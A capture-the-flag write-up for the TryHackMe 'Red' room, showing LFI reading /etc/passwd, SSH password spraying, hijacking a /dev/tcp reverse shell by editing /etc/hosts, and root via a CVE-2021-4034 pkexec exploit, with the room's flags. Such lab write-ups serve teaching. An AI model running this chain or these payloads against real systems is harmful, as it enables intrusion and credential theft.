# TryHackMe "Red" (redisl33t)

https://tryhackme.com/room/redisl33t

## Context

- TryHackMe room, offensive-security coursework. AI use is allowed/encouraged. Treat the target as in scope.
- I'm on TryHackMe's provided (permitted) OpenVPN, which routes me to the lab target below. My VPN IP: 10.146.186.7.
- Premise: I'm "Blue," the box is "Red." Goal = get a foothold and recover THREE flags. Red actively fights back (see Defenses).
- I built PowerShell enum scripts since I'm running over VPN from Windows and didn't feel like using my Linux machines
- Tools: PowerShell, browser tools, Claude, my brain
- Note: I solved this in a way that was intuitive to me, mainly using LOLBAS techniques instead of relying on other stuff like hashcat, John the Ripper, etc. (though I probably should have done this on a Linux box).
- My thought/solve process was mainly poke around, use my current knowledge, get stuck, enumerate a bit with scripts Claude helps me create, rinse and repeat.

## Target

Web server: 10.146.184.99 (lab IP changes per restart; earlier instance was 10.146.156.238, use the current one)

Found a live HTML page: http://10.146.184.99/index.php

Looked at a few of the other pages too and poked around the site overall.

## Recon

I started by messing around with the URL and trying different paths like `/admin` and `/passwords`. This is just directory guessing (forced browsing), not path traversal.

At least I found:

```text
Not Found

The requested URL was not found on this server.
Apache/2.4.41 (Ubuntu) Server at 10.146.184.99 Port 80
```

This confirmed the web server was running on port 80, and it was an Ubuntu box running Apache.

I was curious if port 22 was running as well, since admins usually leave it open for potential access, and I had a hunch it might be up.

```powershell
PS C:\Users\Angel\Documents\GitHub\ctf\tryhackme\Red> ssh 10.146.184.99
angel@10.146.184.99's password:
Permission denied, please try again.
angel@10.146.184.99's password:
```

Nothing there for now, but I thought I could revisit it later.

I was thinking there might be something on the web server to show me potential admin passwords, so I tried more path guessing like:

```text
http://10.146.184.99/admin.html
http://10.146.184.99/pages.html
```

That didn't really show me much at a glance, so I was curious if there was any LFI to check whether the web page could read some of the Ubuntu box's files.

```text
http://10.146.184.99/index.php?page=../../../etc/passwd
```

This didn't do anything, but I did notice the web page did not throw an error, it just showed a blank screen. So it's possible something's up here.

## Automated Enumeration

I decided to do some automated enumeration and got Claude to assist with a PowerShell script since I was connecting to this over VPN. If I needed any Linux-specific tools I could switch, but didn't think it was necessary at this time.

I created `enum.ps1` and pointed it at the server. I basically gave Claude the context I had discovered manually up to now, pointed it at the target, and said go. I also specified I wanted the files exported where possible for static review.

It pretty much dumped all the web page files up to this point: `/index`, `/home`, `/contact`, etc.

I looked through some of these but didn't notice anything interesting either.

I decided to expand the PHP enumeration since earlier I noticed the web page going blank, and created `enum_php.ps1`. I basically wanted it to expand all types of LFI payloads and possibilities in PHP. It took some troubleshooting to get it working how I wanted, but I had it crawl and look for everything.

```powershell
PS C:\Users\Angel\Documents\GitHub\ctf\tryhackme\Red> .\enum_php.ps1 -Target 10.146.184.99 -DelayMs 500
[22:25:52] === Automatic PHP vulnerability scan: http://10.146.184.99:80/ ===
[22:25:52] --- Crawling for PHP files and parameters ---
[22:25:52]   crawled /                             [200] len=15757
[22:25:53]   crawled /sidebar-right.html           [200] len=9974
[22:25:54]   crawled /index.html                   -> NO RESPONSE
[22:25:54]   crawled /about.html                   [200] len=9309
[22:25:55]   crawled /services.html                [200] len=9131
[22:25:55]   crawled /portfolio.html               [200] len=14352
[22:25:56]   crawled /index.php?=portfolio.html    [200] len=15757
[22:25:57]   crawled /contact.html                 [200] len=7507
[22:25:57] PHP files seen: index.php
[22:25:57] Parameters discovered from links: index.php|page
[22:25:57] Total candidates to test (capped at 40): 15
[22:25:57] candidate: page=
[22:25:57] CONFIRMED LFI  page=php://filter/resource=/etc/passwd  (real /etc/passwd content)
```

## LFI Confirmed

After that I went to the page it flagged: `page=php://filter/resource=/etc/passwd`.

Claude helped me make that script, and when we hit:

```shell
http://10.146.184.99/index.php?page=php://filter/resource=/etc/passwd
```

my script also exported this output:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
blue:x:1000:1000:blue:/home/blue:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
red:x:1001:1001::/home/red:/bin/bash
```

In here I noticed a bunch of real user accounts (not just service accounts). The interesting ones are `blue` (uid 1000, home `/home/blue`, `/bin/bash`) and `red` (uid 1001, home `/home/red`, `/bin/bash`), both with real login shells. Those are my likely SSH targets. I was wondering if there was a way to continue the automation of reading these users' home directories and their contents, as well as any files further down.

## Credential Harvesting

I created a script called `lfi_read.ps1` to see if we could read a bit more into these files in an automated fashion. I got Claude to help, and also added instructions to look in common places where credentials leak, like bash history files, and any other likely spots.

I let this script run for a while. This also helped me exfiltrate data and save it into my `loot_lfi_10_146_184_99` folder.

From this, I found `home_blue_.reminder`, which had a password: `sup3r_p@s$w0rd!`. I thought maybe it was a flag and tested it, but that did not work.

My next assumption was that it was probably the SSH password.

```powershell
PS C:\Users\Angel\Documents\GitHub\ctf\tryhackme\Red> ssh blue@10.146.184.99
blue@10.146.184.99's password:
Permission denied, please try again.
blue@10.146.184.99's password:
Permission denied, please try again.
blue@10.146.184.99's password:
```

That ended up being incorrect.

Looking at some of the exfiltrated files, I noticed `home_blue_.bash_history`, which had a command running hashcat to create a list of passwords from the `.reminder` file. It was confusing to read, but it led me to believe the password might be getting swapped/rotated.

So I went back to Claude and asked it to help me create a script to spray the password list generated from that `.reminder` key. It was a long shot, but I got it to run for a while in `spray_red.ps1`.

## Password Spray and Flag 1

```powershell
PS C:\Users\Angel\Documents\GitHub\ctf\tryhackme\Red> .\spray_red.ps1

cmdlet spray_red.ps1 at command pipeline position 1
Supply values for the following parameters:
Target: 10.146.184.99
[*] Installing Posh-SSH (one-time)...
[*] Generated 64 candidates from seed 'sup3r_p@s$w0rd!'
[*] Spray round 1/4 ...
[+] SUCCESS  blue : sup3r_p@s$w0rd!9
uid=1000(blue) gid=1000(blue) groups=1000(blue)
--- flags ---
/proc/sys/kernel/acpi_video_flags
/proc/sys/kernel/sched_domain/cpu0/domain0/flags
/proc/sys/kernel/sched_domain/cpu1/domain0/flags
/proc/kpageflags
/sys/devices/pnp0/00:04/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS15/flags
/sys/devices/platform/serial8250/tty/ttyS6/flags
/sys/devices/platform/serial8250/tty/ttyS23/flags
/sys/devices/platform/serial8250/tty/ttyS13/flags
/sys/devices/platform/serial8250/tty/ttyS31/flags
/sys/devices/platform/serial8250/tty/ttyS4/flags
/sys/devices/platform/serial8250/tty/ttyS21/flags
/sys/devices/platform/serial8250/tty/ttyS11/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS28/flags
/sys/devices/platform/serial8250/tty/ttyS18/flags
/sys/devices/platform/serial8250/tty/ttyS9/flags
/sys/devices/platform/serial8250/tty/ttyS26/flags
/sys/devices/platform/serial8250/tty/ttyS16/flags
/sys/devices/platform/serial8250/tty/ttyS7/flags
/sys/devices/platform/serial8250/tty/ttyS24/flags
/sys/devices/platform/serial8250/tty/ttyS14/flags
/sys/devices/platform/serial8250/tty/ttyS5/flags
/sys/devices/platform/serial8250/tty/ttyS22/flags
/sys/devices/platform/serial8250/tty/ttyS12/flags
/sys/devices/platform/serial8250/tty/ttyS30/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS20/flags
/sys/devices/platform/serial8250/tty/ttyS10/flags
/sys/devices/platform/serial8250/tty/ttyS29/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS19/flags
/sys/devices/platform/serial8250/tty/ttyS27/flags
/sys/devices/platform/serial8250/tty/ttyS17/flags
/sys/devices/platform/serial8250/tty/ttyS8/flags
/sys/devices/platform/serial8250/tty/ttyS25/flags
/sys/devices/pci0000:00/0000:00:05.0/net/ens5/flags
/sys/devices/virtual/net/lo/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/home/red/flag2
/home/blue/flag1
/usr/src/linux-headers-5.4.0-144-generic/include/config/trace/irqflags
/usr/src/linux-headers-5.4.0-144-generic/include/config/arch/uses/high/vma/flags.h
/usr/src/linux-headers-5.4.0-144/tools/perf/trace/beauty/move_mount_flags.sh
/usr/src/linux-headers-5.4.0-144/tools/perf/trace/beauty/mount_flags.sh
/usr/src/linux-headers-5.4.0-144/tools/perf/trace/beauty/mmap_flags.sh
/usr/src/linux-headers-5.4.0-144/tools/perf/trace/beauty/rename_flags.sh
/usr/src/linux-headers-5.4.0-144/include/asm-generic/irqflags.h
/usr/src/linux-headers-5.4.0-144/include/trace/events/mmflags.h
/usr/src/linux-headers-5.4.0-144/include/uapi/linux/kernel-page-flags.h
/usr/src/linux-headers-5.4.0-144/include/uapi/linux/tty_flags.h
/usr/src/linux-headers-5.4.0-144/include/linux/kernel-page-flags.h
/usr/src/linux-headers-5.4.0-144/include/linux/irqflags.h
/usr/src/linux-headers-5.4.0-144/include/linux/page-flags-layout.h
/usr/src/linux-headers-5.4.0-144/include/linux/pageblock-flags.h
/usr/src/linux-headers-5.4.0-144/include/linux/page-flags.h
/usr/src/linux-headers-5.4.0-144/arch/um/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/arch/c6x/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/arch/parisc/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/arch/ia64/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/arch/microblaze/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/arch/hexagon/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/arch/arm64/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/arch/arm64/include/asm/daifflags.h
/usr/src/linux-headers-5.4.0-144/arch/arm/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/arch/mips/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/arch/nios2/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/arch/x86/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/arch/x86/include/asm/processor-flags.h
/usr/src/linux-headers-5.4.0-144/arch/x86/include/uapi/asm/processor-flags.h
/usr/src/linux-headers-5.4.0-144/arch/x86/kernel/cpu/mkcapflags.sh
/usr/src/linux-headers-5.4.0-144/arch/h8300/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/arch/xtensa/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/arch/s390/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/arch/alpha/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/arch/nds32/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/arch/openrisc/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/arch/unicore32/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/arch/riscv/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/arch/sh/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/arch/powerpc/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/arch/arc/include/asm/irqflags-arcv2.h
/usr/src/linux-headers-5.4.0-144/arch/arc/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/arch/arc/include/asm/irqflags-compact.h
/usr/src/linux-headers-5.4.0-144/arch/m68k/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/arch/csky/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/arch/sparc/include/asm/irqflags_64.h
/usr/src/linux-headers-5.4.0-144/arch/sparc/include/asm/irqflags_32.h
/usr/src/linux-headers-5.4.0-144/arch/sparc/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-144/scripts/coccinelle/locks/flags.cocci
/usr/src/linux-headers-5.4.0-124/tools/perf/trace/beauty/move_mount_flags.sh
/usr/src/linux-headers-5.4.0-124/tools/perf/trace/beauty/mount_flags.sh
/usr/src/linux-headers-5.4.0-124/tools/perf/trace/beauty/mmap_flags.sh
/usr/src/linux-headers-5.4.0-124/tools/perf/trace/beauty/rename_flags.sh
/usr/src/linux-headers-5.4.0-124/include/asm-generic/irqflags.h
/usr/src/linux-headers-5.4.0-124/include/trace/events/mmflags.h
/usr/src/linux-headers-5.4.0-124/include/uapi/linux/kernel-page-flags.h
/usr/src/linux-headers-5.4.0-124/include/uapi/linux/tty_flags.h
/usr/src/linux-headers-5.4.0-124/include/linux/kernel-page-flags.h
/usr/src/linux-headers-5.4.0-124/include/linux/irqflags.h
/usr/src/linux-headers-5.4.0-124/include/linux/page-flags-layout.h
/usr/src/linux-headers-5.4.0-124/include/linux/pageblock-flags.h
/usr/src/linux-headers-5.4.0-124/include/linux/page-flags.h
/usr/src/linux-headers-5.4.0-124/arch/um/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/arch/c6x/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/arch/parisc/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/arch/ia64/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/arch/microblaze/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/arch/hexagon/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/arch/arm64/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/arch/arm64/include/asm/daifflags.h
/usr/src/linux-headers-5.4.0-124/arch/arm/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/arch/mips/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/arch/nios2/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/arch/x86/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/arch/x86/include/asm/processor-flags.h
/usr/src/linux-headers-5.4.0-124/arch/x86/include/uapi/asm/processor-flags.h
/usr/src/linux-headers-5.4.0-124/arch/x86/kernel/cpu/mkcapflags.sh
/usr/src/linux-headers-5.4.0-124/arch/h8300/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/arch/xtensa/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/arch/s390/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/arch/alpha/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/arch/nds32/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/arch/openrisc/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/arch/unicore32/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/arch/riscv/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/arch/sh/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/arch/powerpc/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/arch/arc/include/asm/irqflags-arcv2.h
/usr/src/linux-headers-5.4.0-124/arch/arc/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/arch/arc/include/asm/irqflags-compact.h
/usr/src/linux-headers-5.4.0-124/arch/m68k/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/arch/csky/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/arch/sparc/include/asm/irqflags_64.h
/usr/src/linux-headers-5.4.0-124/arch/sparc/include/asm/irqflags_32.h
/usr/src/linux-headers-5.4.0-124/arch/sparc/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-124/scripts/coccinelle/locks/flags.cocci
/usr/src/linux-headers-5.4.0-146-generic/include/config/trace/irqflags
/usr/src/linux-headers-5.4.0-146-generic/include/config/arch/uses/high/vma/flags.h
/usr/src/linux-headers-5.4.0-124-generic/include/config/trace/irqflags
/usr/src/linux-headers-5.4.0-124-generic/include/config/arch/uses/high/vma/flags.h
/usr/src/linux-headers-5.4.0-146/tools/perf/trace/beauty/move_mount_flags.sh
/usr/src/linux-headers-5.4.0-146/tools/perf/trace/beauty/mount_flags.sh
/usr/src/linux-headers-5.4.0-146/tools/perf/trace/beauty/mmap_flags.sh
/usr/src/linux-headers-5.4.0-146/tools/perf/trace/beauty/rename_flags.sh
/usr/src/linux-headers-5.4.0-146/include/asm-generic/irqflags.h
/usr/src/linux-headers-5.4.0-146/include/trace/events/mmflags.h
/usr/src/linux-headers-5.4.0-146/include/uapi/linux/kernel-page-flags.h
/usr/src/linux-headers-5.4.0-146/include/uapi/linux/tty_flags.h
/usr/src/linux-headers-5.4.0-146/include/linux/kernel-page-flags.h
/usr/src/linux-headers-5.4.0-146/include/linux/irqflags.h
/usr/src/linux-headers-5.4.0-146/include/linux/page-flags-layout.h
/usr/src/linux-headers-5.4.0-146/include/linux/pageblock-flags.h
/usr/src/linux-headers-5.4.0-146/include/linux/page-flags.h
/usr/src/linux-headers-5.4.0-146/arch/um/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/arch/c6x/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/arch/parisc/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/arch/ia64/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/arch/microblaze/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/arch/hexagon/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/arch/arm64/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/arch/arm64/include/asm/daifflags.h
/usr/src/linux-headers-5.4.0-146/arch/arm/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/arch/mips/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/arch/nios2/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/arch/x86/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/arch/x86/include/asm/processor-flags.h
/usr/src/linux-headers-5.4.0-146/arch/x86/include/uapi/asm/processor-flags.h
/usr/src/linux-headers-5.4.0-146/arch/x86/kernel/cpu/mkcapflags.sh
/usr/src/linux-headers-5.4.0-146/arch/h8300/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/arch/xtensa/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/arch/s390/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/arch/alpha/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/arch/nds32/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/arch/openrisc/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/arch/unicore32/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/arch/riscv/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/arch/sh/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/arch/powerpc/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/arch/arc/include/asm/irqflags-arcv2.h
/usr/src/linux-headers-5.4.0-146/arch/arc/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/arch/arc/include/asm/irqflags-compact.h
/usr/src/linux-headers-5.4.0-146/arch/m68k/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/arch/csky/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/arch/sparc/include/asm/irqflags_64.h
/usr/src/linux-headers-5.4.0-146/arch/sparc/include/asm/irqflags_32.h
/usr/src/linux-headers-5.4.0-146/arch/sparc/include/asm/irqflags.h
/usr/src/linux-headers-5.4.0-146/scripts/coccinelle/locks/flags.cocci
/usr/include/x86_64-linux-gnu/asm/processor-flags.h
/usr/include/x86_64-linux-gnu/bits/termios-c_oflag.h
/usr/include/x86_64-linux-gnu/bits/termios-c_lflag.h
/usr/include/x86_64-linux-gnu/bits/waitflags.h
/usr/include/x86_64-linux-gnu/bits/termios-c_iflag.h
/usr/include/x86_64-linux-gnu/bits/termios-c_cflag.h
/usr/include/x86_64-linux-gnu/bits/ss_flags.h
/usr/include/x86_64-linux-gnu/bits/mman-map-flags-generic.h
/usr/include/polkit-1/polkit/polkitcheckauthorizationflags.h
/usr/include/linux/kernel-page-flags.h
/usr/include/linux/tty_flags.h
/usr/share/perl5/Dpkg/BuildFlags.pm
/usr/share/man/man2/ioctl_iflags.2.gz
/usr/share/man/man3/Dpkg::BuildFlags.3perl.gz
/usr/share/man/man3/fesetexceptflag.3.gz
/usr/share/man/man3/set_matchpathcon_flags.3.gz
/usr/share/man/man3/security_compute_av_flags.3.gz
/usr/share/man/man3/fegetexceptflag.3.gz
/usr/share/man/man3/security_compute_av_flags_raw.3.gz
/usr/lib/x86_64-linux-gnu/perl/5.30.0/bits/waitflags.ph
/usr/lib/x86_64-linux-gnu/perl/5.30.0/bits/ss_flags.ph
total 40
drwxr-xr-x 4 root blue 4096 Aug 14  2022 .
drwxr-xr-x 4 root root 4096 Aug 14  2022 ..
-rw-r--r-- 1 blue blue  166 Sep 11 03:55 .bash_history
-rw-r--r-- 1 blue blue  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 blue blue 3771 Feb 25  2020 .bashrc
drwx------ 2 blue blue 4096 Aug 13  2022 .cache
-rw-r----- 1 root blue   34 Aug 14  2022 flag1
-rw-r--r-- 1 blue blue  807 Feb 25  2020 .profile
-rw-r--r-- 1 blue blue   16 Aug 14  2022 .reminder
drwx------ 2 root blue 4096 Aug 13  2022 .ssh
PS C:\Users\Angel\Documents\GitHub\ctf\tryhackme\Red>
```

Well, that kind of worked and we found some output and the flag directories, but I noticed I got kicked.

```text
/home/red/flag2
/home/blue/flag1
```

I opted to make a better script called `shell_red.ps1` to read those flag folders directly and also help me establish a shell once we sprayed, so I could run this over again anytime and stay connected.

```powershell
PS C:\Users\Angel\Documents\GitHub\ctf\tryhackme\Red> .\shell_red.ps1

cmdlet shell_red.ps1 at command pipeline position 1
Supply values for the following parameters:
Target: 10.146.184.99
[*] spraying for a live password (round 1/6)...
[+] in as blue : sup3r_p@s$w0rd!123
== flag1 ==
THM{Is_thAt_all_y0u_can_d0_blU3?}
uid=1000(blue) gid=1000(blue) groups=1000(blue)


[ interactive - type commands, 'exit' to quit. session auto-recovers if kicked ]
blue@red$:
```

That ended up being flag 1.

## Post-Exploitation Enumeration

Once I was in the box, I was a bit stuck. At this point it felt like my tactic changed from initial access to more of establishing persistence and possibly escalating privilege on the box, and seeing if I could get rid of whatever was changing the passwords.

Coming from a sysadmin background, I tried to get a good feel for what permissions my current `blue` user had, what they could and couldn't do. I asked Claude to give me some basic commands so we could get a feel for where we were at.

```bash
# 1. who am I / what groups
id

# 2. processes running as OTHER users
ps -eo user,pid,cmd --sort=user | grep -v '^blue'

# 3. can I run anything as another user
sudo -n -l 2>&1

# 4. SUID root binaries
find / -perm -4000 -type f 2>/dev/null

# 5. scheduled tasks
cat /etc/crontab; ls -la /etc/cron.d 2>&1

# 6. files I can write that I shouldn't be able to
find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys|run)'
```

From this we found:

- **#3 sudo:** "password required" = dead end.
- **#4 SUID:** all stock Ubuntu binaries, nothing custom = dead end.
- **#5 cron:** stock = dead end.
- **#2 processes:** `red` is running `bash -i >& /dev/tcp/redrules.thm/9001`, a reverse shell reaching out to the host `redrules.thm` on port 9001.
- **#6 writable:** `/etc/hosts` is writable by me.

```shell
blue@red$: grep redrules /etc/hosts
192.168.0.1 redrules.thm

blue@red$:
```

## Reverse Shell Hijack and Flag 2

This looked like a reverse shell `red` had pointing to some listener. I got the feeling maybe we could hijack it. I asked Claude for assistance with this and set up ncat so we could listen.

```shell
printf '192.168.130.247 redrules.thm\n127.0.0.1 localhost\n127.0.1.1 red\n' > /etc/hosts
grep redrules /etc/hosts
```

```shell
blue@red$: echo '192.168.130.247 redrules.thm' >> /etc/hosts

blue@red$: grep redrules /etc/hosts
192.168.0.1 redrules.thm
192.168.130.247 redrules.thm
```

```shell
red@red:~$ cat /home/red/flag2
cat /home/red/flag2
THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}
red@red:~$
```

This let me get the second flag, which we previously didn't have access to as `blue`.

## Privilege Escalation and Flag 3

Next, I reran what we did as `blue` to see if `red` had more permissions. The 4th check (SUID binaries) gave me all this:

```shell
red@red:~$ id
id
uid=1001(red) gid=1001(red) groups=1001(red)
red@red:~$ find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
/home/red/.git/pkexec
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/bin/at
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/su
/snap/snapd/18933/usr/lib/snapd/snap-confine
/snap/snapd/18596/usr/lib/snapd/snap-confine
/snap/core20/1828/usr/bin/chfn
/snap/core20/1828/usr/bin/chsh
/snap/core20/1828/usr/bin/gpasswd
/snap/core20/1828/usr/bin/mount
/snap/core20/1828/usr/bin/newgrp
/snap/core20/1828/usr/bin/passwd
/snap/core20/1828/usr/bin/su
/snap/core20/1828/usr/bin/sudo
/snap/core20/1828/usr/bin/umount
/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1828/usr/lib/openssh/ssh-keysign
/snap/core20/1852/usr/bin/chfn
/snap/core20/1852/usr/bin/chsh
/snap/core20/1852/usr/bin/gpasswd
/snap/core20/1852/usr/bin/mount
/snap/core20/1852/usr/bin/newgrp
/snap/core20/1852/usr/bin/passwd
/snap/core20/1852/usr/bin/su
/snap/core20/1852/usr/bin/sudo
/snap/core20/1852/usr/bin/umount
/snap/core20/1852/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1852/usr/lib/openssh/ssh-keysign
red@red:~$
```

I feel like there could have been a ton of places to look here, but Claude flagged `/home/red/.git/pkexec` as abnormal on two counts: pkexec shouldn't be in a home folder, and it's SUID-root, which is exactly what check #4 was looking for. Time to fingerprint it:

```shell
red@red:~$ ~/.git/pkexec --version
~/.git/pkexec --version
pkexec version 0.105
red@red:~$
```

I looked at that pkexec version and googled vulnerabilities for it. There were a ton.

I was pretty sure this was what we were supposed to do at this point, but I had trouble finding an easy way to do this without running cmake or building anything.

I checked if the box had Python installed, and it did, so that was great.

```shell
red@red:~$ python3 -v
python3 -v
import _frozen_importlib # frozen
import _imp # builtin
```

I found a Python pkexec exploit for CVE-2021-4034 here: [Almorabea/pkexec-exploit](https://github.com/Almorabea/pkexec-exploit). No compiler needed, which was my concertn before. The script targets `/usr/bin/pkexec` by default, but I needed it pointed at the local SUID copy instead, so I edited it to call `/home/red/.git/pkexec`:

```python
libc.execve(b'/home/red/.git/pkexec', c_char_p(None), environ_p)
```

I saved it as `/tmp/hack/exploit.py` and ran it:

```shell
red@red:/tmp/hack$ python3 exploit
/usr/bin/python3: can't find '__main__' module in 'exploit'
red@red:/tmp/hack$ python3 exploit.py
Do you want to choose a custom payload? y/n (n use default payload)  n
[+] Cleaning previous exploiting attempt (if exist)
[+] Creating shared library for exploit code
[+] Finding a libc library to call execve
[+] Found a library at <CDLL 'libc.so.6', handle 7f5fa13e4000 at 0x7f5fa0...>
[+] Call execve() with chosen payload
[+] Enjoy your root shell
# whoami
root
```

Root. From there:

```shell
# cd /root
# ls
defense flag3 snap
# cat flag3
THM{Go0d_Gam3_Blu3_GG}
```

